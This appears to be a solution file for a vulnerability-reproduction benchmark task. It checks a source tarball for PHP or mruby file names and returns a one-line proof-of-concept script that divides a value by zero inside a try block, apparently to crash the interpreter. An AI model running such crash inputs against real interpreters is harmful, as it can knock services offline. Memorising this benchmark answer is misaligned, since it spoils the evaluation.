import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def list_tar_members(path):
            try:
                with tarfile.open(path, "r:*") as tf:
                    return [m.name for m in tf.getmembers()]
            except Exception:
                return []
        names = list_tar_members(src_path)
        low = [n.lower() for n in names]

        def is_php():
            if not names:
                return False
            markers = [
                "/zend/", "/main/php", "/sapi/cli", "/ext/", "zend_vm_def.h",
                "zend_string.h", "zend_execute.c", "php_cli.c"
            ]
            for n in low:
                for m in markers:
                    if m in n:
                        return True
            # Fallback heuristic: top-level folder name contains php
            for n in names:
                parts = n.split("/")
                if parts:
                    if "php" in parts[0].lower():
                        return True
            return False

        def is_mruby():
            if not names:
                return False
            markers = [
                "include/mruby.h", "/mrblib/", "/src/vm.c", "/mruby.h", "/mruby/", "/mrbgems/"
            ]
            for n in low:
                for m in markers:
                    if m in n:
                        return True
            return False

        if is_php():
            poc = "<?php try{$a=str_repeat('A',1024);$a/=0;}catch(Throwable $e){}?>"
            return poc.encode()
        if is_mruby():
            poc = "begin;a=1;a/=0;rescue ZeroDivisionError;end"
            return poc.encode()
        # Default to a PHP-style PoC as a best effort
        return b"<?php try{$a=str_repeat('A',1024);$a/=0;}catch(Throwable $e){}?>"